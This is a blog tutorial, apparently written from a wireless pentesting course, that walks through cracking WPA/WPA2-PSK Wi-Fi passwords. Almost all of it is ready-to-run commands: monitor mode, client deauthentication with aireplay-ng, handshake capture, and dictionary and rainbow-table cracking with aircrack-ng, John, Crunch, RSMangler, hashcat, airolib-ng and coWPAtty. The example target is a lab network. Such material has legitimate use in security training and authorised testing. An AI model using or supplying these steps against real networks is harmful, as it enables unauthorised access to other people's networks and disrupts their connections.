---
layout: single
title: WPA cracking with aircrack-ng
excerpt: "En este post se describe como realizar un ataque a WPA utilizando aircrack-ng desde poner la tarjeta en modo monitor hasta comprobar si la contraseña extraída es válida o es una autenticación errónea del usuario."
date: 2022-05-11
classes: wide
header:
  teaser: /assets/images/Wireless/aircrack-icon.jpg
  teaser_home_page: true
  icon: /assets/images/wireless.png
categories:
  - Wifi
tags:
  - CLI
  - Aircrack-ng
  - Wifi Hacking
  - WPA

---


# Getting a handshake
## Set interface to monitor mode
```bash
airmon-ng check kill
airmon-ng start wlan0
```

## Choose a target
```bash
airodump-ng wlan0mon
```

We will choose a target who has **PSK** auth method, and we will store the **chanel**, the **bssid** the **essid** and a **client bssid**.

Example target:
- ESSID: wifu
- BSSID: 34:08:04:09:3D:38
- Channel: 3
- Client BSSID: 00:18:4D:1D:A8:1F

![Airodump-ng_example](/assets/images/Wireless/Airodump-ng_example.png)

## Prepare our capture scenario.
```bash
airodump-ng -c 3 --essid wifu --bssid 34:08:04:09:3D:38 -w wpa wlan0mon
```

We will store the capture into "wpa.\*" files.

## Deathenticate a client
```bash
aireplay-ng -0 1 -a 34:08:04:09:3D:38 -c 00:18:4D:1D:A8:1F wlan0mon
```

### Troubleshooting
-   Some wireless drivers ignore directed deauthentication and only respond to broadcast deauthentication. We can run the same aireplay-ng deauthentication command without the -c parameter.


## Cracking Hash
Once the client reconnects with the target AP, airodump-ng will be able to capture a handshake.

![HandShake](/assets/images/Wireless/HandShake.png)

Before terminating airodump-ng with `<ctrl>+c`, let's continue to capture traffic between the client and the AP. This additional data will assist us in confirming the key is correct later on.

```bash
aircrack-ng -w /usr/share/john/password.lst -e wifu -b 34:08:04:09:3D:38 wpa-01.cap
```

### Troubleshooting
-   If 802.11w is in use, unencrypted deauthentication frames are ignored. The only course of action is to wait for a client to connect.
-   The device simply didn't reconnect or was already out of range of the AP.

## Verifying its validity
Aircrack-ng successfully cracked our easy passphrase. However, we should confirm it is correct. It is possible that we captured a client's unsuccessful attempt to connect to the network. This is where we make use of the additional traffic we captured between the client and the AP.

```bash
airdecap-ng -b 34:08:04:09:3D:38 -e wifu -p 12345678 wpa-01.cap
```
(Obviously the -p parameter if for the cracked passphrase)

Our results show airdecap-ng successfully decrypted 37 packets. In some cases, where there is a pause in decryptable traffic, airdecap-ng may indicate "0" even if the passphrase is correct.

### Troubleshooting
- Another way we can confirm our passphrase is to use Wireshark and add it to a capture as described in the Wireshark module.

- Another option is to capture another handshake with airodump-ng and capture more follow-on traffic. We may be able to just capture traffic between the same client and AP, then combine both capture files if little time has elapsed. Rekeying can happen up to an hour after initial handshake.

# Custom wordlists to crack
## Search for router default patterns
It is rare to know an AP's model prior to an engagement, but we can determine some information about the device's manufacturer from its [IEEE _Organizationally Unique Identifier_ (OUI)](https://portal.offensive-security.com/courses/pen-210/books-and-videos/modal/modules/cracking-authentication-hashes/custom-wordlists-with-aircrack-ng/custom-wordlists-with-aircrack-ng#fn3). To do this, we'll look in the first three bytes of the BSSID.

## Expand wordlists
In addition to all of this, there are many tools that can mangle and expand our wordlists. We will focus on three popular ones.

-   _John the Ripper_, also known as John or abbreviated as JtR
-   _Crunch_
-   _RSMangler_

While all of these tools will mangle words, Crunch is a bit different because it is mostly used to create wordlists from scratch. The capabilities of these tools also overlap, and two tools often can achieve the same result. It's likely that the tool we choose will depend on personal preference.

## Pipe John rules to aircrack-ng
```bash
john --wordlist=/usr/share/john/password.lst --rules --stdout | aircrack-ng -e wifu -w - wpa-02.cap
```

## Aircrack-ng with CRUNCH
### Crunch usage
Given a pattern and a character set or words, Crunch is able to generate all possible combinations.
```bash
crunch 8 9 abc123
```
(Because it is 58TB long, we short the output just with the characters "abc123")

```bash
crunch 11 11 -t Password%%%
```
(Generate an 11 lenght password + 3 numbers dictionary)

```bash
crunch 1 1 -p dog cat house 
```
(Generate an all combinations of theese words wordlist)

```bash
crunch 5 5 -t ddd%% -p dog cat bird
```
(Generate an all combinations of theese words wordlist and add 2 numbers)

### Pipe wordlists to aircrack
```bash
crunch 11 11 -t Password%% | aircrack-ng -e wifu wpa-02.cap -w - 
```

## Aircrack-ng with RSMangler
```bash
rsmangler --file wordlist.txt --min 12 --max 13 | aircrack-ng -e wifu wpa-03.cap -w - 
```

# Cracking hash with Hashcat
We need to transform the cap file int o a hccapx.
```bash
apt install hashcat-utils
cap2hccapx wifu-01.cap output.hccapx
hashcat -m 2500 output.hccapx /usr/share/john/password.lst
```

# Airolib-ng (RT)
Airolib-ng is a tool designed to store and manage ESSID and password lists, compute their Pairwise Master Keys (PMK), and use them in order to crack WPA and WPA2 PSK passphrases. It uses the lightweight _SQLite3_ database as its storage mechanism, which is available on most platforms. (Rainbow tables)

## File with the ESSID
```bash
echo wifu > essid.txt
```

## Importing ESSID into airolib-ng db
```bash
airolib-ng wifu.sqlite --import essid essid.txt
```

## Displaying stored info
```bash
airolib-ng wifu.sqlite --stats
```

## Import passwords dict
```bash
airolib-ng wifu.sqlite --import passwd /usr/share/john/password.lst
```

## Compute
```bash
airolib-ng wifu.sqlite --batch
```

## Displaying stored info
```bash
airolib-ng wifu.sqlite --stats
```

## Cracking with a DB in aircrack-ng
```bash
aircrack-ng -r wifu.sqlite wpa1-01.cap
```

# coWPAtty (RT)
## Generating the Rainbow Table
```bash
genpmk -f /usr/share/john/password.lst -s wifu -d wifuhashes 
```
(Where wifu is the ESSID, and wifuhashes the outputfile)

## Cracking with cowpatty
```bash
cowpatty -r wpajohn-01.cap -s wifu -d wifuhashes
```
